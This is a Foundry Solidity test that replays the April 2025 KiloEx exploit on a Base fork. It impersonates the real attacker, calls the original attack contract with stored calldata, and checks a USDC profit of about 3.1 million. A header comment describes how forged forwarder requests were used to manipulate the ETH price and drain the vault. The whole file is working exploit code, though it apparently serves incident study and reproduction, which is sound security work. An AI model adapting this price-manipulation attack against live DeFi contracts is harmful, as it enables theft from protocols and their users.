// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

/*
    @KeyInfo
    - Total Lost: ~$7.5M across Base, BSC, opBNB, and Taiko
    - Attacker: 0x00fac92881556a90fdb19eae9f23640b95b4bcbd
    - Attack Contract: 0xd649a0876453fc7626569b28e364262192874e18
    - Representative Base Tx: https://basescan.org/tx/0x6b378c84aa57097fb5845f285476e33d6832b8090d36d02fe0e1aed909228edd
    - Analysis: https://quillaudits.medium.com/kiloex-exploit-breakdown-7-4m-drained-across-chains-ff6e2293d5cb

    KiloEx's MinimalForwarder accepted forged forwarded requests. The attacker used
    that path to set ETH to an artificial low price, opened a leveraged long, then
    set an artificial high price and closed it against the protocol vault.
*/

interface IERC20KiloEx {
    function balanceOf(
        address account
    ) external view returns (uint256);
}

contract KiloExExploitTest is Test {
    address private constant ATTACKER = 0x00faC92881556A90FdB19eAe9F23640B95B4bcBd;
    address private constant ATTACK_CONTRACT = 0xd649A0876453Fc7626569B28E364262192874E18;
    IERC20KiloEx private constant USDC = IERC20KiloEx(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);

    function setUp() public {
        vm.createSelectFork("base", 28_933_729);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack contract");
    }

    function testExploit() public {
        bytes memory attackCalldata = vm.parseBytes(vm.readLine("src/test/2025-04/kiloex_calldata.txt"));
        uint256 usdcBefore = USDC.balanceOf(ATTACKER);
        uint256 callValue = 36_000_000_000_001;
        vm.deal(ATTACKER, callValue);

        vm.prank(ATTACKER, ATTACKER);
        (bool success, bytes memory returnData) = ATTACK_CONTRACT.call{value: callValue}(attackCalldata);
        if (!success) emit log_named_bytes("revert data", returnData);
        assertTrue(success, "historical KiloEx exploit call reverted");

        uint256 usdcProfit = USDC.balanceOf(ATTACKER) - usdcBefore;
        emit log_named_decimal_uint("USDC profit", usdcProfit, 6);
        assertEq(usdcProfit, 3_125_495.724597e6);
    }
}
